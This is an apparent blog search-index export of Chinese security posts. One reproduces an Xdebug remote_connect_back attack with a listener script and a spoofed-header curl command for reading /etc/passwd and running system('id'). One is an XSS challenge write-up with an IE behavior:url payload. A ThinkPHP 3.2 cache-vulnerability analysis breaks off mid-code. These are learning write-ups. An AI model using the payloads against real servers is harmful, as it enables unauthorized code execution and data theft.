<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[Xdebug原理学习及其攻击面复现]]></title>
      <url>/2017/09/27/Xdebug%E5%8E%9F%E7%90%86%E5%8F%8A%E5%85%B6%E6%94%BB%E5%87%BB%E9%9D%A2%E5%A4%8D%E7%8E%B0/</url>
      <content type="html"><![CDATA[<h3 id="Xdebug的工作原理可以总结为下面几个步骤"><a href="#Xdebug的工作原理可以总结为下面几个步骤" class="headerlink" title="Xdebug的工作原理可以总结为下面几个步骤"></a>Xdebug的工作原理可以总结为下面几个步骤</h3><p><a href="https://my.oschina.net/atanl/blog/371424?fromerr=FV9ksMPu" target="_blank" rel="external">文字部分来自互联网</a></p>
<p>1）IDE中已经集成了一个遵循BGDp的Xdebug插件。当要debug的时候，点击一些IDE的某个按钮，启动这个插件。该插件会启动一个9000的端口监听远程服务器发过来的debug信息。其中BGDp是客户端和服务端的通信协议</p>
<p>2）浏览器向Httpd服务器发送一个带有<code>XDEBUG_SESSION_START</code>参数的请求，Httpd收到这个请求之后交给后端的PHP进行处理</p>
<p>3）Php（有Xdebug的拓展）看到这个请求是带了<code>XDEBUG_SESSION_START</code> 参数，就告诉Xdebug，“嘿，我要debug喔，你准备一下”。<strong>这时，Xdebug这时会向来源ip客户端的9000端口（IDE监听）发送一个debug请求，然后客户端的9000端口响应这个请求，那么debug就开始了。</strong></p>
<p>4）Php知道Xdebug已经准备好了，那么就开始开始一行一行的执行代码，但是每执行一行都会让Xdebug过滤一下。</p>
<p>5）Xdebug开始过滤代码，<strong>Xdebug在过滤每一行代码的时候，都会暂停代码的执行，然后向客户端的9000端口发送该行代码的执行情况，等待客户端的决策</strong>。</p>
<p>6）相应，客户端（IDE）收到Xdebug发送过来的执行情况，就可以把这些信息展示给开发者看了，包括一些变量的值等。同时向Xdebug发送下一步应该什么。</p>
<p> <img src="1.png" alt="">实际过程中的抓包如图</p>
<p>当链接建立成功的时候php端会[PSH，ACK]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">490.&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</div><div class="line">&lt;init xmlns=&quot;urn:debugger_protocol_v1&quot; xmlns:xdebug=&quot;http://xdebug.org/dbgp/xdebug&quot; fileuri=&quot;file:///var/www/html/test1.php&quot; language=&quot;PHP&quot; xdebug:language_version=&quot;7.0.22-2&quot; protocol_version=&quot;1.0&quot; appid=&quot;2000&quot; idekey=&quot;phpstorm&quot;&gt;</div><div class="line">    &lt;engine version=&quot;2.5.5&quot;&gt;</div><div class="line">        &lt;![CDATA[Xdebug]]&gt;</div><div class="line">&lt;/engine&gt;</div><div class="line">    &lt;author&gt;</div><div class="line">        &lt;![CDATA[Derick Rethans]]&gt;</div><div class="line">&lt;/author&gt;</div><div class="line">    &lt;url&gt;</div><div class="line">        &lt;![CDATA[http://xdebug.org]]&gt;</div><div class="line">&lt;/url&gt;</div><div class="line">    &lt;copyright&gt;</div><div class="line">        &lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;</div><div class="line">&lt;/copyright&gt;</div><div class="line">&lt;/init&gt;</div></pre></td></tr></table></figure>
<h3 id="动态连接操作步骤"><a href="#动态连接操作步骤" class="headerlink" title="动态连接操作步骤"></a>动态连接操作步骤</h3><p>因为一些蜜汁原因，我个人在进行动态调试的过程是这样的</p>
<p>phpstorm打开项目设置断点，并打开监听</p>
<p>浏览器打开xdebug插件</p>
<p>访问项目url</p>
<p>回到phpstorm开始调试</p>
<p>需要注意的在调试过程中有输出，并不会立即出现在网页上，待全部调试结束后才会输出到网页中。为什么会这样我不懂</p>
<p>调试的之前你需要确保你已经配置好了xdebug扩展(php.ini)</p>
<h2 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h2><p>来自<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="external">初心を忘れず</a></p>
<p>这里将文中提到的姿势进行复现,偷一波脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python2</div><div class="line">import socket</div><div class="line"></div><div class="line">ip_port = (&apos;0.0.0.0&apos;,9000)</div><div class="line">sk = socket.socket()</div><div class="line">sk.bind(ip_port)</div><div class="line">sk.listen(10)</div><div class="line">conn, addr = sk.accept()</div><div class="line"></div><div class="line">while True:</div><div class="line">    client_data = conn.recv(1024)</div><div class="line">    print(client_data)</div><div class="line"></div><div class="line">    data = raw_input(&apos;&gt;&gt; &apos;)</div><div class="line">    #conn.sendall(&apos;eval -i 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</div><div class="line">    conn.sendall(&apos;source -i 1 -f %s\x00&apos; % data)</div><div class="line">    #conn.sendall(&apos;property_set -n $a -i 1 -c 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl &apos;http://192.168.169.88/test1.php?XDEBUG_SESSION_START=phpstorm&apos; -H &quot;X-Forwarded-For: 192.168.169.36&quot;</div></pre></td></tr></table></figure>
<p><strong>source</strong></p>
<p><code>file:///etc/passwd</code></p>
<p><img src="2.png" alt=""></p>
<p><strong>eval</strong></p>
<p><code>system(&quot;id&quot;);</code></p>
<p>  <img src="4.png" alt=""></p>
<p><img src="3.png" alt=""></p>
<p><strong>property_set</strong></p>
<p> system(“id”);<img src="5.png" alt=""></p>
<p>退出后可以看到 <img src="6.png" alt=""></p>
<p>尝试写shell失败（test是777）</p>
<p> <img src="7.png" alt="">忽然想到可以base64</p>
<p> <img src="8.png" alt=""></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>利用条件是要<strong>xdebug.remote_connect_back</strong>开启</p>
<p>在文档是这样描述的：</p>
<p><strong>xdebug.remote_connect_back</strong></p>
<p>类型: <em>boolean</em>, 默认值: <em>0</em>, 始于 <em>Xdebug &gt; 2.1</em></p>
<p>如果设置生效， <a href="https://xdebug.org/docs/all_settings#remote_host" target="_blank" rel="external">xdebug.remote_host</a> 设置会忽略而Xdebug会尝试给制造HTTP请求的客户端进行连接。它会检查$_SERVER[‘REMOTE_ADDR’] 变量并找出使用的IP地址。请记住它没有有效的过滤，任何人都能启动调试会话连接到服务器，即使他们的地址并不匹配 <a href="https://xdebug.org/docs/all_settings#remote_host" target="_blank" rel="external">xdebug.remote_host</a>.</p>
]]></content>
      
        
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Xdebug原理学习及其攻击面复现]]></title>
      <url>/2017/09/27/Xdebug%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0%E5%8F%8A%E6%94%BB%E5%87%BB%E9%9D%A2%E5%A4%8D%E7%8E%B0.md/</url>
      <content type="html"><![CDATA[<h3 id="Xdebug的工作原理可以总结为下面几个步骤"><a href="#Xdebug的工作原理可以总结为下面几个步骤" class="headerlink" title="Xdebug的工作原理可以总结为下面几个步骤"></a>Xdebug的工作原理可以总结为下面几个步骤</h3><p><a href="https://my.oschina.net/atanl/blog/371424?fromerr=FV9ksMPu" target="_blank" rel="external">文字部分来自互联网</a></p>
<p>1）IDE中已经集成了一个遵循BGDp的Xdebug插件。当要debug的时候，点击一些IDE的某个按钮，启动这个插件。该插件会启动一个9000的端口监听远程服务器发过来的debug信息。其中BGDp是客户端和服务端的通信协议</p>
<p>2）浏览器向Httpd服务器发送一个带有<code>XDEBUG_SESSION_START</code>参数的请求，Httpd收到这个请求之后交给后端的PHP进行处理</p>
<p>3）Php（有Xdebug的拓展）看到这个请求是带了<code>XDEBUG_SESSION_START</code> 参数，就告诉Xdebug，“嘿，我要debug喔，你准备一下”。<strong>这时，Xdebug这时会向来源ip客户端的9000端口（IDE监听）发送一个debug请求，然后客户端的9000端口响应这个请求，那么debug就开始了。</strong></p>
<p>4）Php知道Xdebug已经准备好了，那么就开始开始一行一行的执行代码，但是每执行一行都会让Xdebug过滤一下。</p>
<p>5）Xdebug开始过滤代码，<strong>Xdebug在过滤每一行代码的时候，都会暂停代码的执行，然后向客户端的9000端口发送该行代码的执行情况，等待客户端的决策</strong>。</p>
<p>6）相应，客户端（IDE）收到Xdebug发送过来的执行情况，就可以把这些信息展示给开发者看了，包括一些变量的值等。同时向Xdebug发送下一步应该什么。</p>
<p> <img src="1.png" alt="">实际过程中的抓包如图</p>
<p>当链接建立成功的时候php端会[PSH，ACK]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">490.&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;</div><div class="line">&lt;init xmlns=&quot;urn:debugger_protocol_v1&quot; xmlns:xdebug=&quot;http://xdebug.org/dbgp/xdebug&quot; fileuri=&quot;file:///var/www/html/test1.php&quot; language=&quot;PHP&quot; xdebug:language_version=&quot;7.0.22-2&quot; protocol_version=&quot;1.0&quot; appid=&quot;2000&quot; idekey=&quot;phpstorm&quot;&gt;&lt;engine version=&quot;2.5.5&quot;&gt;&lt;![CDATA[Xdebug]]&gt;&lt;/engine&gt;&lt;author&gt;&lt;![CDATA[Derick Rethans]]&gt;&lt;/author&gt;&lt;url&gt;&lt;![CDATA[http://xdebug.org]]&gt;&lt;/url&gt;&lt;copyright&gt;&lt;![CDATA[Copyright (c) 2002-2017 by Derick Rethans]]&gt;&lt;/copyright&gt;&lt;/init&gt;.</div></pre></td></tr></table></figure>
<h3 id="动态连接操作步骤"><a href="#动态连接操作步骤" class="headerlink" title="动态连接操作步骤"></a>动态连接操作步骤</h3><p>因为一些蜜汁原因，我个人在进行动态调试的过程是这样的</p>
<p>phpstorm打开项目设置断点，并打开监听</p>
<p>浏览器打开xdebug插件</p>
<p>访问项目url</p>
<p>回到phpstorm开始调试</p>
<p>需要注意的在调试过程中有输出，并不会立即出现在网页上，待全部调试结束后才会输出到网页中。为什么会这样我不懂</p>
<p>调试的之前你需要确保你已经配置好了xdebug扩展(php.ini)</p>
<h2 id="攻击面"><a href="#攻击面" class="headerlink" title="攻击面"></a>攻击面</h2><p>来自<a href="https://ricterz.me/posts/Xdebug%3A%20A%20Tiny%20Attack%20Surface" target="_blank" rel="external">初心を忘れず</a></p>
<p>这里将文中提到的姿势进行复现,偷一波脚本</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/python2</div><div class="line">import socket</div><div class="line"></div><div class="line">ip_port = (&apos;0.0.0.0&apos;,9000)</div><div class="line">sk = socket.socket()</div><div class="line">sk.bind(ip_port)</div><div class="line">sk.listen(10)</div><div class="line">conn, addr = sk.accept()</div><div class="line"></div><div class="line">while True:</div><div class="line">    client_data = conn.recv(1024)</div><div class="line">    print(client_data)</div><div class="line"></div><div class="line">    data = raw_input(&apos;&gt;&gt; &apos;)</div><div class="line">    #conn.sendall(&apos;eval -i 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</div><div class="line">    conn.sendall(&apos;source -i 1 -f %s\x00&apos; % data)</div><div class="line">    #conn.sendall(&apos;property_set -n $a -i 1 -c 1 -- %s\x00&apos; % data.encode(&apos;base64&apos;))</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl &apos;http://192.168.169.88/test1.php?XDEBUG_SESSION_START=phpstorm&apos; -H &quot;X-Forwarded-For: 192.168.169.36&quot;</div></pre></td></tr></table></figure>
<p><strong>source</strong></p>
<p><code>file:///etc/passwd</code></p>
<p><img src="2.png" alt=""></p>
<p><strong>eval</strong></p>
<p><code>system(&quot;id&quot;);</code></p>
<p>  <img src="4.png" alt=""></p>
<p><img src="3.png" alt=""></p>
<p><strong>property_set</strong></p>
<p> system(“id”);<img src="5.png" alt=""></p>
<p>退出后可以看到 <img src="6.png" alt=""></p>
<p>尝试写shell失败（test是777）</p>
<p> <img src="7.png" alt="">忽然想到可以base64</p>
<p> <img src="8.png" alt=""></p>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>利用条件是要<strong>xdebug.remote_connect_back</strong>开启</p>
<p>在文档是这样描述的：</p>
<p><strong>xdebug.remote_connect_back</strong></p>
<p>类型: <em>boolean</em>, 默认值: <em>0</em>, 始于 <em>Xdebug &gt; 2.1</em></p>
<p>如果设置生效， <a href="https://xdebug.org/docs/all_settings#remote_host" target="_blank" rel="external">xdebug.remote_host</a> 设置会忽略而Xdebug会尝试给制造HTTP请求的客户端进行连接。它会检查$_SERVER[‘REMOTE_ADDR’] 变量并找出使用的IP地址。请记住它没有有效的过滤，任何人都能启动调试会话连接到服务器，即使他们的地址并不匹配 <a href="https://xdebug.org/docs/all_settings#remote_host" target="_blank" rel="external">xdebug.remote_host</a>.</p>
]]></content>
      
        
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[记录xss挑战赛14题解题过程]]></title>
      <url>/2017/09/01/%E8%AE%B0%E5%BD%95xss%E6%8C%91%E6%88%98%E8%B5%9B14%E9%A2%98%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/</url>
      <content type="html"><![CDATA[<p>只思考了这道题，然后就陷进去了。先来看题</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">header(&apos;X-XSS-Protection:0&apos;);</div><div class="line">header(&apos;Content-Type:text/html;charset=utf-8&apos;);</div><div class="line">?&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;form action=&apos;&apos;&gt;</div><div class="line">&lt;input type=&apos;hidden&apos; name=&apos;token&apos; value=&apos;&lt;?php</div><div class="line">  echo htmlspecialchars($_GET[&apos;token&apos;]); ?&gt;&apos;&gt;</div><div class="line">&lt;input type=&apos;submit&apos;&gt;</div><div class="line">&lt;/body&gt;</div></pre></td></tr></table></figure>
<p>考点是输出点出现在input hidden框里面，因为文本框被隐藏一般的和点击有关的事件（如 onfocus）就不会被触发了。</p>
<p>传统的解法大概有三种</p>
<p>第一种：IE6下用css的expression属性触发</p>
<p>第二种：firefox用accesskey=”X” onclick=alert(),然后shift+alt+x 触发</p>
<p>第三种：如果输入点在<code>type=hidden</code>前可以用另外一个type如<code>type=text</code>将<code>type=hidden</code>覆盖掉（这道题不行）</p>
<p>显然传统的办法肯定不会通过的（规则是：需要最新浏览器，不需要交互）</p>
<p>然后我就开始了漫漫的踩坑路。因为源码中有<code>&lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;IE=10&quot;&gt;</code>所以我认为xss是在IE下触发.然后打开<a href="https://msdn.microsoft.com/zh-cn/library/ms535835(v=vs.85" target="_blank" rel="external">input=hidden的官方手册</a>.aspx)惊喜的发现<code>input hidden</code>下还有on*事件</p>
<p> <img src="捕获.PNG" alt=""></p>
<p>然后百度了一下用法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">onbeforedeactivate	</div><div class="line">Fires immediately before the activeElement is changed from the current object to another object in the parent document.</div><div class="line">在 activeElement 从当前对象变为父文档其它对象之前立即触发。不懂~</div><div class="line"></div><div class="line">ondatasetcomplete	</div><div class="line">Fires to indicate that all data is available from the data source object.</div><div class="line">数据在数据源发生变化时触发的事件，不懂~</div><div class="line"></div><div class="line">oninvalid</div><div class="line">Provides specified alert text if an input element is invalid.</div><div class="line">&lt;input type=&quot;text&quot; oninvalid=&quot;alert(&apos;该项不能空!&apos;);&quot; name=&quot;fname&quot; required&gt;</div><div class="line">&lt;input type=&quot;text&quot; name=&quot;phone&quot; maxlength=&quot;11&quot; pattern=&quot;^(0|86|17951)?1[0-9]&#123;10&#125;&quot; </div><div class="line">    oninvalid=&quot;setCustomValidity(&apos;请输入11位手机号&apos;);&quot;/&gt;</div><div class="line"></div><div class="line"></div><div class="line">onselect</div><div class="line">onselect 事件会在文本框中的文本被选中时发生。	</div><div class="line">Fires when the current selection changes.</div><div class="line"></div><div class="line">onpropertychange</div><div class="line">动态监听输入框值变化的情况，比如value属性的值改变时会触发</div></pre></td></tr></table></figure>
<p>前两个不是很懂什么意思，试了后三个都不行</p>
<p>oninvalid：oninvalid一般情况下必须要配合<code>required</code>或者<code>pattern</code>,可惜的是hidden下均不支持</p>
<p>onselect：显然框都隐藏了，不可能还需要文本，况且需要交互。</p>
<p>onpropertychange：是一个死逻辑，想改变value值就许必须有个js触发点然后用DOM，不过既然都有触法点了谁还会用这个属性（这道题而言）</p>
<p>然后我就蒙蔽了，既然通常情况下都不行，那为什么还会写在<code>input type=hidden</code>下面，黑人问号？？？</p>
<p><img src="捕获3.PNG" alt=""></p>
<p>最后看到了柠檬师傅的正确答案</p>
<p><code>token=&#39; style=behavior:url(x) onreadystatechange=alert(1) &#39;</code></p>
<p>后来查资料发现这是一个IE6~IE10支持的一个css的语法，behavior:url(???)允许调用一个外部的.htc文件来修改HTML的行为和方法（但是受同源策略影响）具体语法可以看<a href="http://www.cnblogs.com/zhwl/archive/2011/02/28/1967176.html" target="_blank" rel="external">这篇文章</a></p>
<p>如果成功就有上传htc文件（可以写更复杂的利用代码而没有长度限制）配合xss这个思路。因为</p>
<p>.htc files are commonly used in .css files using an IE specific property called behavior, using this along with the .htc file allows the browser to run JavaScript code which is whats contained within the file.</p>
<p>下面是是一个利用demo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">　　　　&lt;html&gt;</div><div class="line">　　　　&lt;head&gt;</div><div class="line">　　　　　　&lt;style&gt;</div><div class="line">　　　　　　h1 &#123; behavior: url(behave.htc) &#125;</div><div class="line">　　　　　　&lt;/style&gt;</div><div class="line">　　　　&lt;/head&gt;</div><div class="line">　　　　&lt;body&gt;</div><div class="line">　　　　　　&lt;h1&gt;把鼠标放在这里 poluoluo.com&lt;/h1&gt;</div><div class="line">　　　　&lt;/body&gt;</div><div class="line">　　　　&lt;/html&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&lt;component&gt;</div><div class="line">&lt;attach for=&quot;element&quot; event=&quot;onmouseover&quot; handler=&quot;hig_lite&quot; /&gt;</div><div class="line">&lt;attach for=&quot;element&quot; event=&quot;onmouseout&quot; handler=&quot;low_lite&quot; /&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">alert(1);</div><div class="line">function hig_lite()</div><div class="line">&#123;</div><div class="line">　　element.style.color=255</div><div class="line">&#125;</div><div class="line">function low_lite()</div><div class="line">&#123;</div><div class="line">　　element.style.color=0</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/component&gt;</div></pre></td></tr></table></figure>
<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>如有出错,还请指教</p>
<p>开学快乐！！</p>
]]></content>
      
        
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[TP框架3.2缓存漏洞]]></title>
      <url>/2017/08/20/TP%E6%A1%86%E6%9E%B63.2%E7%BC%93%E5%AD%98%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<p>之前学php的时候就对php里面的缓存技术很疑惑，前些日子爆出的<a href="https://xianzhi.aliyun.com/forum/read/1973.html" target="_blank" rel="external">thinkphp缓存getshell漏洞</a>看着大佬追了一便代码，自己也想尝试追一下，顺便了解一下何为缓存。实验用的是TP3.2有此漏洞的版本</p>
<h2 id="何为缓存？"><a href="#何为缓存？" class="headerlink" title="何为缓存？"></a>何为缓存？</h2><p>具体<a href="http://www.thinkphp.cn/code/1579.html" target="_blank" rel="external">http://www.thinkphp.cn/code/1579.html</a></p>
<p>简单的说就是减少服务器压力，将用户常见的的网页事先静态存储好。个人认为，一般情况下TP用的是数据缓存，即将数据缓存到一个php文件中，文件名包含一个id来唯一标示（TP中是一个md5值）</p>
<h2 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h2><h3 id="配置数据库"><a href="#配置数据库" class="headerlink" title="配置数据库"></a>配置数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">CREATE database article</div><div class="line"></div><div class="line">CREATE TABLE article (</div><div class="line">content VARCHAR(255)</div><div class="line">);</div><div class="line"></div><div class="line">&apos;DB_NAME&apos; =&gt; &apos;aritcle&apos;//在config.php中添加该键值对</div></pre></td></tr></table></figure>
<h3 id="写入代码"><a href="#写入代码" class="headerlink" title="写入代码"></a>写入代码</h3><p>修改home/controller/indexController.class.php 如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">namespace Home\Controller;</div><div class="line">class IndexController &#123;</div><div class="line">	function index()&#123;</div><div class="line">		echo &quot;welcome&quot;;</div><div class="line">	&#125;</div><div class="line">	function save()&#123;</div><div class="line">		$content = array(&apos;content&apos; =&gt; I(&apos;get.content&apos;));</div><div class="line">		$amodel = M(&apos;article&apos;);</div><div class="line">		$amodel-&gt;data($content)-&gt;add();</div><div class="line">	&#125;</div><div class="line">	function cache()&#123;</div><div class="line">		$amodel = M(&apos;article&apos;);</div><div class="line">		$content = $amodel-&gt;select();</div><div class="line">		var_dump($content);</div><div class="line">		S(&apos;content&apos;,$content,3600);</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="缓存函数用法"><a href="#缓存函数用法" class="headerlink" title="缓存函数用法"></a>缓存函数用法</h2><p>在TP3.2版本中，起缓存功能的是S函数，用法如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">// 使用data标识缓存$Data数据</div><div class="line">S(&apos;data&apos;,$Data);  //前面的是缓存标示，后面的是缓存的数据</div><div class="line">// 缓存$Data数据3600秒</div><div class="line">S(&apos;data&apos;,$Data,3600);</div><div class="line">// 删除缓存数据</div><div class="line">S(&apos;data&apos;,NULL);  //第一个参数时缓存的标识名</div></pre></td></tr></table></figure>
<h2 id="下面为第一次创建缓存（理想情况下）的代码跟踪"><a href="#下面为第一次创建缓存（理想情况下）的代码跟踪" class="headerlink" title="下面为第一次创建缓存（理想情况下）的代码跟踪"></a>下面为第一次创建缓存（理想情况下）的代码跟踪</h2><p>跟进S函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line"> * 缓存管理</div><div class="line"> * @param mixed $name 缓存名称，如果为数组表示进行缓存设置</div><div class="line"> * @param mixed $value 缓存值</div><div class="line"> * @param mixed $options 缓存参数</div><div class="line"> * @return mixed</div><div class="line"> */</div><div class="line">function S($name,$value=&apos;&apos;,$options=null) &#123;</div><div class="line">    static $cache   =   &apos;&apos;;</div><div class="line">	/*省略*/</div><div class="line">    &#125;elseif(empty($cache)) &#123; // 自动初始化</div><div class="line">        $cache      =   Think\Cache::getInstance();//创建缓存时从这里进入</div><div class="line">    &#125;</div><div class="line">    if(&apos;&apos;=== $value)&#123; // 获取缓存</div><div class="line">        return $cache-&gt;get($name);</div><div class="line">    &#125;elseif(is_null($value)) &#123; // 删除缓存</div><div class="line">        return $cache-&gt;rm($name);</div><div class="line">    &#125;else &#123; // 缓存数据</div><div class="line">        /*省略*/</div><div class="line">        return $cache-&gt;set($name, $value, $expire);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>创建缓存时进入<code>Think\Cache::getInstance()</code>，这个方法检索静态数组是否已经有缓存实例，如果有就返回，没有则创建。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">  /**</div><div class="line">   * 取得缓存类实例</div><div class="line">   * @static</div><div class="line">   * @access public</div><div class="line">   * @return mixed</div><div class="line">   */</div><div class="line">  static function getInstance($type=&apos;&apos;,$options=array()) &#123;</div><div class="line">static $_instance	=	array();//静态变量，储存所有创建的缓存实例</div><div class="line">$guid	=	$type.to_guid_string($options);//返回一个md5编号，以待稍后作为数组键值</div><div class="line">if(!isset($_instance[$guid]))&#123;//如果缓存实例不存在则创建</div><div class="line">	$obj	=	new Cache();</div><div class="line">	$_instance[$guid]	=	$obj-&gt;connect($type,$options);</div><div class="line">&#125;</div><div class="line">return $_instance[$guid];</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>md5标识号生成方式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line"> * 根据PHP各种类型变量生成唯一标识号</div><div class="line"> * @param mixed $mix 变量</div><div class="line"> * @return string</div><div class="line"> */</div><div class="line">function to_guid_string($mix) &#123;</div><div class="line">    /*省略*/</div><div class="line">    &#125; else &#123;</div><div class="line">        $mix = serialize($mix);</div><div class="line">    &#125;</div><div class="line">    return md5($mix);//返回一个序列化的md5值</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>跟进<code>$obj-&gt;connect($type,$options);</code>这个方法是在配置一些初始值，比如缓存的类型，路径信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line"> * 连接缓存</div><div class="line"> * @access public</div><div class="line"> * @param string $type 缓存类型</div><div class="line"> * @param array $options  配置数组</div><div class="line"> * @return object</div><div class="line"> */</div><div class="line">public function connect($type=&apos;&apos;,$options=array()) &#123;</div><div class="line">    if(empty($type))  $type = C(&apos;DATA_CACHE_TYPE&apos;);//如果为$type空，默认缓存类型为FILE</div><div class="line">    $class  =   